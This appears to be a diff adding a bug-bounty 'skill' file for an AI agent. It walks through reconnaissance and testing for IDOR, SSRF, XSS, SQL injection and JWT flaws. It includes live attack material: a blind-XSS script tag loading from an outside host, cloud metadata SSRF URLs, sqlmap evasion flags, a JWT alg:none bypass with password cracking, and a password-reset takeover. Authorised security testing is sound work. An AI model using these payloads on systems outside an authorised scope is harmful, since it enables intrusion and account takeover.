@@ -1,0 +1,251 @@
+# Skill: /bugbounty — HUNTER Mode
+
+## Trigger
+User types `/bugbounty` or `/hunt` or session mode = bugbounty
+
+## Core Philosophy
+Passive-first. Scope-strict. PoC-driven. Business impact > technical severity.
+
+---
+
+## Workflow
+
+```
+PROGRAM_RECON → ASSET_DISCOVERY → FINGERPRINT → VULNERABILITY_HUNT → PoC → REPORT
+```
+
+---
+
+## Phase 1: Program Recon
+
+Before touching anything:
+```bash
+# Read program policy
+cat state/scope.txt
+
+# Document what's in/out of scope in wiki
+# Note: bounty tiers, response SLA, special rules (no automated scanning, etc.)
+```
+
+Key questions:
+- What assets are in scope?
+- What's explicitly out of scope?
+- What's the max bounty for critical?
+- Any special rules (no CSRF, only P1s, etc.)?
+
+---
+
+## Phase 2: Asset Discovery
+
+```bash
+# Subdomain enum
+subfinder -d $TARGET -all -recursive -silent -o raw/$SESSION/subdomains_subfinder.txt
+amass enum -passive -d $TARGET -o raw/$SESSION/subdomains_amass.txt
+cat raw/$SESSION/subdomains_*.txt | sort -u > raw/$SESSION/subdomains_all.txt
+
+# Live check
+httpx -l raw/$SESSION/subdomains_all.txt \
+  -status-code -title -tech-detect -content-length \
+  -o raw/$SESSION/live_hosts.txt
+
+# Port scan on live hosts (if port scanning allowed)
+naabu -l raw/$SESSION/live_hosts.txt -p 80,443,8080,8443,3000,4000,5000,8000,9000 \
+  -o raw/$SESSION/open_ports.txt
+
+# Favicon hash → Shodan fingerprint
+# Get favicon: curl https://target.com/favicon.ico | md5sum
+# Shodan: http.favicon.hash:HASH
+```
+
+---
+
+## Phase 3: Endpoint & Secret Discovery
+
+```bash
+# JS file crawl
+katana -u $TARGET -d 5 -jc -silent -o raw/$SESSION/endpoints.txt
+gau $TARGET --threads 5 | tee raw/$SESSION/gau.txt
+waybackurls $TARGET | tee raw/$SESSION/wayback.txt
+
+# Combine and deduplicate
+cat raw/$SESSION/endpoints.txt raw/$SESSION/gau.txt raw/$SESSION/wayback.txt \
+  | sort -u > raw/$SESSION/all_endpoints.txt
+
+# Secret hunting
+gf secrets raw/$SESSION/all_endpoints.txt | tee raw/$SESSION/secret_urls.txt
+trufflehog filesystem . --json 2>/dev/null | tee raw/$SESSION/trufflehog.txt
+
+# GitHub dorks (manual — automated dorks can violate ToS)
+# Search: site:github.com "target.com" AND ("api_key" OR "secret" OR "password")
+
+# Parameter discovery
+arjun -u https://$TARGET/api/endpoint -m GET -o raw/$SESSION/params.json
+```
+
+---
+
+## Phase 4: Vulnerability Hunting
+
+### IDOR / Broken Access Control (Highest ROI)
+```bash
+# Setup: 2 accounts (attacker + victim)
+# Systematically replace IDs in every request
+
+# Test:
+# - Numeric IDs: user_id=123 → try 122, 124
+# - GUIDs: swap between accounts
+# - Nested objects: /api/v1/users/123/orders/456
+# - Indirect: email=victim@example.com as param
+
+# Tools: Burp Intruder / Autorize extension
+# Manual: intercept every request in Burp, test auth
+```
+
+### Authentication
+```bash
+# Password reset
+# 1. Request reset for attacker account
+# 2. Intercept → change Host: header to your server
+# 3. If token received at your server → reset victim account
+
+# OAuth
+# - Missing state param → CSRF
+# - Token leakage in Referer header
+# - redirect_uri not validated → account takeover
+
+# JWT
+jwt_tool $TOKEN -T         # tamper
+jwt_tool $TOKEN -X a       # alg:none bypass  
+jwt_tool $TOKEN -C -d /usr/share/wordlists/rockyou.txt  # crack
+```
+
+### SSRF
+```bash
+# Find params: url=, webhook=, callback=, fetch=, src=, href=, endpoint=
+# Payloads:
+# http://169.254.169.254/latest/meta-data/  (AWS)
+# http://metadata.google.internal/          (GCP)
+# http://169.254.169.254/metadata/v1/       (DigitalOcean)
+# http://100.100.100.200/latest/meta-data/  (Alibaba)
+
+# OOB detection
+interactsh-client -v &
+# Use: http://INTERACTSH_URL as payload
+```
+
+### XSS
+```bash
+# DOM XSS: audit JS for sink functions
+# document.write(), innerHTML, eval(), setTimeout()
+
+# Reflected: fuzz every param
+dalfox url "https://$TARGET/search?q=FUZZ" \
+  -o raw/$SESSION/xss_dalfox.txt
+
+# Blind XSS: use XSS Hunter
+# Payload: "><script src="https://your.xsshunter.com/x"></script>
+# Target: admin panels, contact forms, feedback, profile fields
+
+# Stored: every field that renders HTML to others
+```
+
+### SQLi
+```bash
+sqlmap -u "$TARGET_URL" \
+  --batch --level 3 --risk 2 \
+  --tamper=space2comment,randomcase \
+  --output-dir raw/$SESSION/sqlmap/ \
+  -p "PARAM_NAME"
+
+# Time-based blind (stealthy):
+sqlmap -u "$TARGET_URL" --technique=T --batch
+```
+
+### Business Logic
+```bash
+# Price manipulation
+# - Negative quantity: qty=-1
+# - Zero price: price=0.00
+# - Race condition: parallel requests (coupon codes, transfers)
+
+# Race condition (Turbo Intruder in Burp):
+# Send 20 requests simultaneously → see if 2 succeed
+
+# Workflow bypass:
+# Skip step 2 → go directly to step 3
+# Replay old tokens/nonces
+```
+
+### API Security
+```bash
+# GraphQL
+curl -s -X POST $API_URL \
+  -H "Content-Type: application/json" \
+  -d '{"query": "{__schema{types{name}}}"}' | python3 -m json.tool
+
+graphw00f -t $API_URL -o raw/$SESSION/graphql.txt
+
+# REST API
+# Try: DELETE/PUT/PATCH on read-only endpoints
+# Mass assignment: add "admin": true, "role": "admin" to POST body
+# Version: /api/v1/ secured, /api/v2/ might not be
+# BOLA: /api/v1/users/OTHER_USER_ID/private-data
+```
+
+---
+
+## Phase 5: Severity Assessment
+
+Use CVSS 3.1 + business impact for prioritization:
+
+| Class | Typical CVSS | Typical Bounty |
+|-------|-------------|----------------|
+| RCE | 9.0-10.0 | $5K-$100K+ |
+| SQLi (auth bypass) | 9.0 | $5K-$50K |
+| Account Takeover | 8.0-9.5 | $3K-$30K |
+| SSRF (internal) | 8.0 | $2K-$20K |
+| IDOR (PII) | 7.5 | $1K-$10K |
+| Stored XSS | 6.5-8.0 | $500-$5K |
+| CSRF | 5.0-7.0 | $100-$2K |
+| Reflected XSS | 4.0-6.0 | $100-$1K |
+| Info Disclosure | 3.0-5.0 | $50-$500 |
+
+---
+
+## Phase 6: PoC & Report
+
+```bash
+# Generate report template
+python3 tools/report.py poc \
+  --type "IDOR" \
+  --severity "High" \
+  --asset "https://api.target.com/v1/users" \
+  --session $SESSION
+```
+
+See: `playbooks/poc-template.md` for full PoC format.
+
+---
+
+## Deduplication Check
+
+Before submitting:
+```bash
+# Check if similar bug already reported
+grep -i "VULN_TYPE" wiki/bounties/*.md
+grep -i "$ENDPOINT" wiki/findings/*.md
+# If found: you may be duplicated → check program's rules on dups
+```
+
+---
+
+## Submission Checklist
+
+- [ ] Target confirmed in scope
+- [ ] Bug reproduced 3x consistently
+- [ ] PoC is minimal (don't access other users' real data)
+- [ ] Screenshots sanitized (blur real PII)
+- [ ] CVSS score calculated
+- [ ] Remediation recommendation included
+- [ ] Timeline documented
+- [ ] Filed to wiki/bounties/SUBMISSION_ID.md
